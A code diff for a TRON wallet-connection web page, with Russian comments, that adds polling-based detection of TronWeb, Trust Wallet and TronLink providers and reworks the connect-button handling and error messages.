@@ -7,31 +7,57 @@ let userAddress = '';
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
-// Проверка наличия TronWeb или мобильного провайдера
-function getTronWeb() {
+// Универсальный поиск провайдера TRON для мобильных кошельков (включая Trust Wallet)
+function findTronProvider() {
+    // 1. Стандартный tronWeb
     if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         return window.tronWeb;
+    }
+    // 2. Альтернативные пути внедрения в мобильных браузерах
+    if (window.trustwallet && window.trustwallet.tronWeb) {
+        return window.trustwallet.tronWeb;
+    }
+    if (window.tronLink) {
+        return window.tronLink.tronWeb;
     }
     return null;
 }
 
+// Функция ожидания появления провайдера при загрузке страницы в кошельке
+async function getTronWeb() {
+    let provider = findTronProvider();
+    if (provider) return provider;
+
+    return new Promise((resolve) => {
+        let attempts = 0;
+        const interval = setInterval(() => {
+            attempts++;
+            provider = findTronProvider();
+            if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
+                clearInterval(interval);
+                resolve(provider);
+            } else if (attempts > 25) { // Ждем до 10 секунд
+                clearInterval(interval);
+                resolve(null);
+            }
+        }, 400);
+    });
+}
+
 connectBtn.addEventListener('click', async () => {
     try {
-        walletAddressText.innerText = "Поиск сети TRON...";
-        let tronWeb = getTronWeb();
+        walletAddressText.innerText = "Поиск кошелька...";
+        let tronWeb = await getTronWeb();
 
-        // Если нативного TronWeb нет (как в Trust Wallet по умолчанию), выводим понятную инструкцию для пользователя
-        if (!tronWeb) {
-            alert('В текущем браузере кошелька не обнаружена сеть TRON. Убедитесь, что вы открыли сайт через DApp-браузер с поддержкой Tron (например, TronLink), либо используйте кошелек с поддержкой WalletConnect для Tron.');
-            walletAddressText.innerText = "Сеть TRON не найдена";
-            return;
+        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+            userAddress = tronWeb.defaultAddress.base58;
+            walletAddressText.innerText = `Подключено: ${userAddress}`;
+            connectBtn.style.display = 'none';
+            transferBtn.style.display = 'inline-block';
+        } else {
+            alert('Кошелек не передал данные сети TRON. Попробуйте обновить страницу внутри браузера кошелька.');
+            walletAddressText.innerText = "Кошелек не найден";
         }
-
-        userAddress = tronWeb.defaultAddress.base58;
-        walletAddressText.innerText = `Подключено: ${userAddress}`;
-        connectBtn.style.display = 'none';
-        transferBtn.style.display = 'inline-block';
-
     } catch (error) {
         console.error("Ошибка подключения:", error);
         alert("Произошла ошибка при подключении.");
@@ -40,7 +66,7 @@ connectBtn.addEventListener('click', async () => {
 
 transferBtn.addEventListener('click', async () => {
     try {
-        const tronWeb = getTronWeb();
+        const tronWeb = await getTronWeb();
         if (!userAddress || !tronWeb) {
             alert('Сначала подключите кошелек!');
             return;
@@ -62,6 +88,6 @@ transferBtn.addEventListener('click', async () => {
 
     } catch (error) {
         console.error("Ошибка при отправке запроса:", error);
-        alert("Ошибка при выполнении транзакции.");
+        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
     }
 });
